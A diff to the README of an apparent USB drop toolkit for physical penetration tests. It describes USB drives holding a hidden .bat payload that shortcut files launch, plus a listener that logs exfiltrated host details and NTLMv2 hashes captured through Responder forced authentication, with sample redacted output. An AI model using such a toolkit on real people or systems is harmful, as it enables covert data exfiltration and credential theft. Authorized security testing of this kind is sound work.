@@ -2,7 +2,7 @@
 ___
 USB Drop Toolkit is designed for physical security assessments where USB drops are part of the engagement. Includes:
 - A PowerShell script to format USB drives with hidden .bat payload executed by shortcut files.
-- A listener to capture exfiltrated host and network details
+- A listener to capture exfiltrated host and network details (including from a Responder forced auth command.)
 
 Base version of this isn't built for C2, but totally could be... just not worth the maintenance here...
 
@@ -24,15 +24,38 @@ E           WORK_DOCS    FAT32          Removable Healthy      OK               
 ```
 2. Start publicly accessible listener... then profit:
 ```bash
-./usb_listener.sh
+ubuntu:~$ sudo ./usb_listener.py
+[*] USB Drop Listener
 [*] Listening on port 8080
 [*] Logging to ./usb_drop_logs.txt
+[?] Have you started Responder on this server? (y/n): y
+[*] Waiting for incoming connections... Press Ctrl+C to stop.
 
-=== Hit @ 2025-06-05 03:42:58 ===
-User: hackerman\matt
-Hostname: Hackerman
-Internal IPs:
-IPv4 Address. . . . . . . . . . . : <redacted-ip>
-IPv4 Address. . . . . . . . . . . : <redacted-ip>
-External IP Address: <redacted-ip>
+
+=== Successful USB Hit from 1.1.1.1 @ 2025-06-05 23:18:31 ===
+=== SYSTEM INFO DUMP ===
+[WHOAMI]
+hackerman\matt
+
+[HOSTNAME]
+Hackerman
+
+[INTERNAL_IP]
+   IPv4 Address. . . . . . . . . . . : <redacted>
+   IPv4 Address. . . . . . . . . . . : <redacted>
+   IPv4 Address. . . . . . . . . . . : <redacted>
+   IPv4 Address. . . . . . . . . . . : <redacted>
+   IPv4 Address. . . . . . . . . . . : <redacted>
+
+[DOMAIN]
+Hackerman
+
+[OS INFO]
+OS Name:                       Microsoft Windows 11 Pro
+OS Version:                    10.0.26100 N/A Build 26100
+Registered Owner:              <redacted>
+Registered Organization:       N/A
+
+[Responder]
+Successful Responder hit: 13:12 PM - [SMB] NTLMv2-SSP Hash     : matt::Hackerman: <redacted-hash>
 ```
